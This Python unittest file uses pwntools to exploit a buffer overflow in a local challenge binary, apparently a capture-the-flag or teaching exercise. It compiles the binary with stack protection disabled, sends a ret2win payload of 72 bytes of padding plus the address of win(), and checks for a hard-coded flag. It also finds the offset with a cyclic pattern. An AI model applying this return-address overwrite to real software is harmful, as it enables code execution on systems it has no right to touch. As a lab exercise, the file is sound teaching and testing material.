#!/usr/bin/env python3
"""
Advanced test script using pwntools to exploit the buffer overflow vulnerability.
"""

import os
import unittest
import tempfile
import subprocess
from pathlib import Path

try:
    from pwn import *
    PWNTOOLS_AVAILABLE = True
except ImportError:
    PWNTOOLS_AVAILABLE = False
    print("Pwntools not available. Some tests will be skipped.")

class TestPwntoolsExploit(unittest.TestCase):
    """Test case for exploiting the buffer overflow using pwntools."""
    
    @classmethod
    def setUpClass(cls):
        """Compile the vulnerable program before running tests."""
        # Get the directory of this file
        current_dir = Path(__file__).parent
        challenge_dir = current_dir / "challenges"
        
        # Source and binary paths
        cls.source_path = challenge_dir / "overflow.c"
        cls.binary_path = challenge_dir / "overflow"
        
        # Compile the vulnerable program
        compile_cmd = [
            "gcc", 
            "-fno-stack-protector", 
            "-no-pie", 
            "-o", str(cls.binary_path), 
            str(cls.source_path)
        ]
        
        try:
            subprocess.run(compile_cmd, check=True)
            print(f"Successfully compiled {cls.binary_path}")
        except subprocess.CalledProcessError as e:
            print(f"Failed to compile: {e}")
            raise
    
    @unittest.skipIf(not PWNTOOLS_AVAILABLE, "Pwntools not available")
    def test_pwntools_exploit(self):
        """Test exploiting the buffer overflow using pwntools."""
        if not PWNTOOLS_AVAILABLE:
            self.skipTest("Pwntools not available")
        
        # Load the binary with pwntools
        elf = ELF(str(self.binary_path))
        
        # Get the address of the win function
        win_addr = elf.symbols['win']
        print(f"Address of win(): {hex(win_addr)}")
        
        # Create a process
        p = process(str(self.binary_path))
        
        # Receive the prompt
        p.recvuntil(b"Enter some text: ")
        
        # Create the payload
        # On 64-bit systems, we need to account for the proper stack alignment
        # The exact offset may need to be adjusted based on the actual binary
        payload = b"A" * 72  # Padding to reach the return address
        payload += p64(win_addr)  # Address of win() function
        
        # Send the payload
        p.sendline(payload)
        
        # Receive the output
        output = p.recvall().decode('utf-8', errors='ignore')
        
        # Check if we successfully called the win function
        self.assertIn("Congratulations", output)
        self.assertIn("flag{simple_buffer_overflow_solved}", output)
        
        p.close()
    
    @unittest.skipIf(not PWNTOOLS_AVAILABLE, "Pwntools not available")
    def test_find_offset(self):
        """Test to find the exact offset to the return address."""
        if not PWNTOOLS_AVAILABLE:
            self.skipTest("Pwntools not available")
        
        # Generate a cyclic pattern to find the offset
        pattern = cyclic(100)
        
        # Create a temporary file with the pattern
        with tempfile.NamedTemporaryFile(mode='wb', delete=False) as f:
            f.write(pattern)
            f.write(b"\n")  # Add newline for gets()
            pattern_file = f.name
        
        try:
            # Run the program with the pattern
            proc = process([str(self.binary_path)], stdin=open(pattern_file, 'rb'))
            proc.wait()
            
            # In a real scenario, we would examine the crash to find the offset
            # For demonstration purposes, we'll just print a message
            print("Pattern sent to find offset. In a real scenario, examine the crash.")
            
        finally:
            os.unlink(pattern_file)
            
if __name__ == "__main__":
    unittest.main() 